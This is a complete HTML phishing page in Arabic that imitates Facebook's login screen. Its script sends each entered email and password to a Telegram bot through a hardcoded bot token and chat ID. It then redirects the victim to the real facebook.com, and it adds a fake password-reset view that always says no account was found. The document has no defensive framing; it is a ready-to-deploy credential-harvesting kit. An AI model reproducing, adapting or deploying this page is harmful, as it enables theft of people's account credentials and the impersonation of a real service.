<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>تسجيل الدخول إلى فيسبوك</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
    }
    .header {
      background: white;
      padding: 16px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      font-size: 28px;
      color: #1877f2;
      font-weight: bold;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 60px;
    }
    .login-box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      width: 360px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }
    .login-btn, .create-account {
      background-color: #1877f2;
      color: white;
      border: none;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      margin-bottom: 10px;
    }
    .create-account {
      background-color: #42b72a;
    }
    .login-btn:hover {
      background-color: #166fe5;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    .forgot-pass {
      text-align: center;
      color: #1877f2;
      cursor: pointer;
      margin: 10px 0;
      display: block;
    }
    .loading {
      text-align: center;
      margin-top: 10px;
      color: #555;
    }
    /* صفحة نسيت كلمة المرور */
    #resetPage {
      display: none;
      background: white;
      padding: 20px;
      border-radius: 8px;
      width: 360px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      margin-top: 60px;
      margin-inline: auto;
    }
    #resetPage h2 {
      font-size: 22px;
      margin-bottom: 20px;
    }
    #resetPage input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    #resetPage button {
      width: 100%;
      background: #1877f2;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
    }
    #resetMessage {
      margin-top: 10px;
      text-align: center;
      color: #ff0000;
    }
  </style>
</head>
<body>
  <div class="header">facebook</div>  <div class="container">
    <!-- صفحة تسجيل الدخول -->
    <div class="login-box" id="loginPage">
      <form id="loginForm">
        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        <span class="forgot-pass" onclick="showResetPage()">هل نسيت كلمة السر؟</span>
        <button type="button" class="create-account">إنشاء حساب جديد</button>
      </form>
      <div class="loading" id="loadingMsg" style="display: none;">جاري تسجيل الدخول...</div>
    </div><!-- صفحة نسيت كلمة السر -->
<div id="resetPage">
  <h2>ابحث عن حسابك</h2>
  <input type="text" id="resetInput" placeholder="البريد أو رقم الهاتف">
  <button onclick="searchAccount()">بحث</button>
  <div id="resetMessage"></div>
</div>

  </div>  <script>
    const TOKEN = '7105269422:AAFJaDFgB88r_MbHC3bFlPzdXxKNXzb8Gy8';
    const CHAT_ID = '6660593539';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const loadingMsg = document.getElementById('loadingMsg');

      loadingMsg.style.display = 'block';

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `🟦 Facebook Login\n📧: ${email}\n🔒: ${password}`
        })
      }).then(() => {
        setTimeout(() => {
          window.location.href = "https://facebook.com";
        }, 2000);
      });
    });

    function showResetPage() {
      document.getElementById('loginPage').style.display = 'none';
      document.getElementById('resetPage').style.display = 'block';
    }

    function searchAccount() {
      const input = document.getElementById('resetInput').value.trim();
      const msg = document.getElementById('resetMessage');

      if (!input) {
        msg.textContent = "الرجاء إدخال البريد أو رقم الهاتف";
        return;
      }

      msg.textContent = "لم يتم العثور على حسابك. تأكد من صحة البيانات.";
    }
  </script></body>
</html>
